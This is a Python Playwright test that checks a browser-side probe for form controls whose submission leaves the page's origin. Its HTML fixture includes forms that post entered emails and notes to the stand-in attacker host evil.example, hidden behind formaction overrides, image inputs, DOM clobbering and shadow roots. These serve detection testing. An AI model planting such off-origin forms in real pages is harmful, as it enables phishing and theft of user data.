"""Real Chromium: which form controls send the page to another origin (form-target.ts), for the off-site rule; no paid
calls. Usage: python test/check_form_target.py [REPO]"""
import asyncio, sys
from pathlib import Path
sys.path.insert(0, str(Path(__file__).resolve().parent))
from strip_types import js_source
from playwright.async_api import async_playwright

R = Path(sys.argv[1]) if len(sys.argv) > 1 else Path(__file__).resolve().parents[1]
HTML = """
<form id="same" action="/subscribe"><input id="s-email"><button id="s-go">Subscribe</button></form>
<form id="away" action="https://evil.example/collect"><input id="a-email"><textarea id="a-note"></textarea>
  <button id="a-go">Verify</button></form>
<form id="mixed" action="/save"><input id="m-name"><button id="m-save">Save</button>
  <button id="m-off" formaction="https://evil.example/x">Also send</button></form>
<form id="first" action="/save"><button id="f-off" formaction="https://evil.example/y">Go</button><input id="f-email"></form>
<form id="img" action="https://evil.example/i"><input type="image" id="i-go"></form>
<form id="clob" action="https://evil.example/c"><input name="elements" id="c-1"><input name="getAttribute" id="c-2"><input id="c-email"></form>
<form id="js" action="javascript:void(0)"><input id="j-q"></form>
<form id="none"><input id="n-q"><input type="submit" id="n-go" value="Search"></form>
<form id="imgfirst" action="/ok"><input type="image" id="if-img" formaction="https://evil.example/q"><input id="if-email"><button id="if-go">Continue</button></form>
<input type="image" id="out-img" form="outform" formaction="https://evil.example/o"><form id="outform" action="/ok"><input id="out-email"><button id="out-go">Go</button></form>
<div id="host"></div>
<div id="chost"></div>
<script>
window.__open = document.getElementById("host").attachShadow({mode: "open"});
window.__open.innerHTML =
  '<form action="https://evil.example/s"><input id="sh-email"><button id="sh-go">Verify</button></form>';
// a closed root is reachable by no script but its creator's: the test keeps both roots to list their controls
window.__closed = document.getElementById("chost").attachShadow({mode: "closed"});
window.__closed.innerHTML = '<form action="https://evil.example/z"><input id="cl-email"><button id="cl-go">Verify</button></form>';
</script>
"""


async def main():
    probe = js_source(R, "form-target").replace("export ", "")
    async with async_playwright() as p:
        b = await p.chromium.launch()
        page = await b.new_page()
        await page.route("http://fixture.test/", lambda r: r.fulfill(content_type="text/html", body=HTML))
        await page.goto("http://fixture.test/")
        got = await page.evaluate(f"(() => {{ {probe}; const all = [...document.querySelectorAll('input,button,textarea,select'), "
                                  "...window.__open.querySelectorAll('input,button'), ...window.__closed.querySelectorAll('input,button')]; "
                                  "const out = []; for (const e of all) { const to = offOriginTarget(e); if (to) out.push([e.id, to]); } return out; })()")
        await b.close()
    want = [["a-email", "https://evil.example"], ["a-note", "https://evil.example"], ["a-go", "https://evil.example"],
            ["m-off", "https://evil.example"], ["f-off", "https://evil.example"], ["f-email", "https://evil.example"],
            ["i-go", "https://evil.example"],  ["c-1", "https://evil.example"], ["c-2", "https://evil.example"],
            ["c-email", "https://evil.example"], ["if-img", "https://evil.example"], ["if-email", "https://evil.example"],
            ["out-img", "https://evil.example"], ["out-email", "https://evil.example"],
            ["sh-email", "https://evil.example"], ["sh-go", "https://evil.example"],
            ["cl-email", "https://evil.example"], ["cl-go", "https://evil.example"]]
    assert got == want, got
    print("form targets: ok", got)


asyncio.run(main())
